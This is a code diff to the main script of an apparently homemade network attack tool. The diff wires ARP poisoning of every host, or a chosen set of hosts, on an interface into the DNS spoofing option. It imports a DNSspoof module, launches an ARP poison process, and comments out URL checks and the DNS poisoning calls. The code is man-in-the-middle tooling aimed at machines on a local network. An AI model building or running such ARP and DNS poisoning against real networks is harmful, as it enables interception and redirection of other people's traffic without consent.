@@ -1,5 +1,6 @@
 import multiprocessing
 import arp
+import DNSspoof
 import ssl
 import scan
 import parser
@@ -46,6 +47,7 @@ def discover():
                 answr = yes_no()
 
                 if answr == 0:  # yes
+                    print(hosts)
                     print("Poisoning all hosts on the interface", interface)
                 else:  # no
 
@@ -62,6 +64,7 @@ def discover():
                     temp = [hosts[i-1] for i in index]
                     hosts = []
                     hosts = temp.copy()
+                    
 
         except Exception:
             print(
@@ -144,17 +147,27 @@ if args.ARP:
 elif args.DNS:
     websites = args.DNS
 
-    no_issue = True  # check if there is an issue with one of the urls. assume there is no issue
-    for url in websites:
-        no_issue = no_issue and is_valid_link(url)
+    arpAttack = arp.Poison(interface, hosts, 5)
+    arpProcess = multiprocessing.Process(
+        target=arpAttack.poison, name="ARP Poison")
+    arpProcess.start()
 
-    if no_issue:
-        # HERE YOU CALL DNS POISONING FUNCTION
-        print(websites)
-    else:
-        print("Cannot begin DNS poisoning. One or more URLs were not correct.\n")
-        print("------------------------------------------------------------------\n")
-        for url in websites:
-            if not is_valid_link(url):
-                print(
-                    "-", url, "is not a valid weblink. Did you append \"https://\" or \"http://\"?")
+    # dnsobject = DNSspoof.DNSPoison()
+    # packet = dnsobject.sniff()
+    # dnsAttack = DNSspoof.DNSPoison()
+    # dnsProcess = multiprocessing.Process(target=dnsAttack.dns_reply(packet), name="DNS Poison")
+    # dnsProcess.start()
+    # no_issue = True  # check if there is an issue with one of the urls. assume there is no issue
+    # for url in websites:
+    #     no_issue = no_issue and is_valid_link(url)
+
+    # if no_issue:
+    #     # HERE YOU CALL DNS POISONING FUNCTION
+    #     print(websites)
+    # else:
+    #     print("Cannot begin DNS poisoning. One or more URLs were not correct.\n")
+    #     print("------------------------------------------------------------------\n")
+    #     for url in websites:
+    #         if not is_valid_link(url):
+    #             print(
+    #                 "-", url, "is not a valid weblink. Did you append \"https://\" or \"http://\"?")
